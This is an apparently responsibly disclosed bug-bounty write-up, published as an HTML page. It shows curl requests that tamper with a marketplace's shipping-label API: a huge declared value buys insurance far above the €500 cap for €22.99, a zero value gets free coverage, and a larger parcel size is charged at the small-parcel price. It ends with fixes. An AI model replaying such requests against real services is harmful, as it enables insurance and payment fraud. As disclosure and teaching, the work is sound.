@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>€99,999,999 of Shipping Insurance for €22.99 — r1gor</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<div class="page-frame">
+<span class="corner-bl">&mdash;</span>
+<span class="corner-br">&mdash;</span>
+<header>
+  <div class="container">
+    <div class="site-id">[00.00_r1gor]<br>[00.00_bugbounty]</div>
+    <a href="../" class="site-title">r1gor</a>
+    <div class="bar"><div class="bar-fill"></div><div class="bar-short"></div></div>
+  </div>
+</header>
+<main class="container">
+<hr class="section-rule">
+<a href="../" class="back">all write-ups</a>
+<article>
+<h1>€99,999,999 of Shipping Insurance for €22.99</h1>
+<canvas id="gen-art" data-seed="07-ninety-nine-million-euros-of-insurance-for-twenty-three" width="640" height="200"></canvas>
+<p>Target is a second-hand marketplace. Their shipping label app lets you
+print a parcel label, optionally with extra coverage in case the
+package goes missing. Pay a few extra euros, get insured up to €500.</p>
+<p>The flow is three calls. Create order, get a price summary, purchase.
+Here is the summary call:</p>
+<pre><code class="language-bash">curl -X PUT &quot;https://[TARGET]/api/orders/summary/$UUID&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;rate_uuid&quot;:&quot;...&quot;,&quot;content_value&quot;:10,&quot;coverage_applied&quot;:true}'
+</code></pre>
+<p><code>content_value</code> is what you say the parcel is worth. The server uses
+that to price the coverage. I sent a bigger number.</p>
+<pre><code class="language-bash">curl -X PUT &quot;https://[TARGET]/api/orders/summary/$UUID&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;rate_uuid&quot;:&quot;...&quot;,&quot;content_value&quot;:99999999,&quot;coverage_applied&quot;:true}'
+</code></pre>
+<pre><code class="language-json">{
+  &quot;coverage_price&quot;:      {&quot;amount&quot;: &quot;20.00&quot;,  &quot;currency&quot;: &quot;EUR&quot;},
+  &quot;label_price&quot;:         {&quot;amount&quot;: &quot;2.99&quot;,   &quot;currency&quot;: &quot;EUR&quot;},
+  &quot;max_coverage_price&quot;:  {&quot;amount&quot;: &quot;500&quot;,    &quot;currency&quot;: &quot;EUR&quot;},
+  &quot;total_price&quot;:         {&quot;amount&quot;: &quot;22.99&quot;,  &quot;currency&quot;: &quot;EUR&quot;},
+  &quot;extra_coverage_price&quot;:{&quot;amount&quot;: &quot;20.00&quot;,  &quot;currency&quot;: &quot;EUR&quot;}
+}
+</code></pre>
+<p>Read that response carefully. The server tells me the maximum
+coverage is €500. Then it accepts a declared value of ninety-nine
+million euros and prices the coverage at twenty euros flat. Same
+response. It is showing me the rule and breaking it in the same JSON
+object.</p>
+<p>Purchased it to be sure.</p>
+<pre><code class="language-bash">curl -X POST &quot;https://[TARGET]/api/orders/purchase/$UUID&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;rate_uuid&quot;:&quot;...&quot;,&quot;point_uuid&quot;:&quot;...&quot;,&quot;parcel_size&quot;:&quot;s&quot;,
+       &quot;content_value&quot;:99999999,&quot;coverage_applied&quot;:true,
+       &quot;content_description&quot;:&quot;max coverage exploit&quot;}'
+</code></pre>
+<pre><code class="language-json">{&quot;redirect_url&quot;:&quot;https://pay.checkout.com/page/hpp_A2FlQx2WtaTE&quot;}
+</code></pre>
+<p>Followed the redirect. Real Checkout.com payment page. Real line items.</p>
+<pre><code>Shipping costs: €2.99
+Extra coverage: €20.00
+Total:          €22.99
+</code></pre>
+<p>The price for insuring a hundred million euros worth of parcel was
+twenty-three euros. If the parcel "got lost" in transit, the carrier
+would owe me the declared value because the coverage was bought
+through the legitimate payment flow.</p>
+<h2>the bonus rounds</h2>
+<p>While I was there I tried two more values.</p>
+<p><code>content_value=0</code> with <code>coverage_applied=true</code>:</p>
+<pre><code>Shipping costs: €2.99
+Extra coverage: €0.00
+Total:          €2.99
+</code></pre>
+<p>Free coverage. The server priced insurance for a parcel worth zero
+euros at zero euros, then happily attached a coverage line item to
+the order anyway. Whatever that coverage covers, it is now mine.</p>
+<p>Then the parcel size. The order is created with a size, but the
+purchase call accepts <code>parcel_size</code> again as a separate field.</p>
+<pre><code class="language-bash"># created as &quot;s&quot; (small, €2.99)
+# purchased as &quot;hl&quot; (huge, €6.49)
+curl -X POST &quot;https://[TARGET]/api/orders/purchase/$UUID&quot; \
+  -d '{&quot;...&quot;,&quot;parcel_size&quot;:&quot;hl&quot;,&quot;content_value&quot;:10,...}'
+</code></pre>
+<pre><code>Total: €2.99
+</code></pre>
+<p>The server prints a label for the bigger size at the smaller size's
+price. The price is computed once at order creation and never
+recomputed. The size is taken from the purchase call without checking
+it matches the order.</p>
+<h2>why it works</h2>
+<p>Three different bugs, one shared root cause: the server trusts the
+client to tell it what the order is worth, what size it is, and
+whether the coverage rule should apply to this particular request.</p>
+<p>The first response literally contains <code>"max_coverage_price": "500"</code>.
+That field exists. Someone wrote it. It just is not connected to the
+validator. Like a speed limit sign with no radar.</p>
+<p>The fix is the same fix everywhere. Recompute price server-side from
+trusted state at the moment of purchase. Validate the declared value
+against the maximum it just told you about. Pick the parcel size from
+the order row, not from the request body.</p>
+<p>I have shipped a lot of parcels in my life. None of them were worth
+ninety-nine million euros. This one would have been.</p>
+</article>
+</main>
+<footer>
+  <div class="container">
+    <div>&copy; 2025 &mdash; responsible disclosure, always.</div>
+    <img src="../email.png" alt="" class="email-img">
+  </div>
+</footer>
+</div>
+<script src="../gen.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(function(pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'copy';
+  btn.onclick = function() {
+    navigator.clipboard.writeText(pre.querySelector('code').textContent);
+    btn.textContent = 'copied';
+    btn.classList.add('copied');
+    setTimeout(function() { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+  };
+  pre.appendChild(btn);
+});
+</script>
+</body>
+</html>
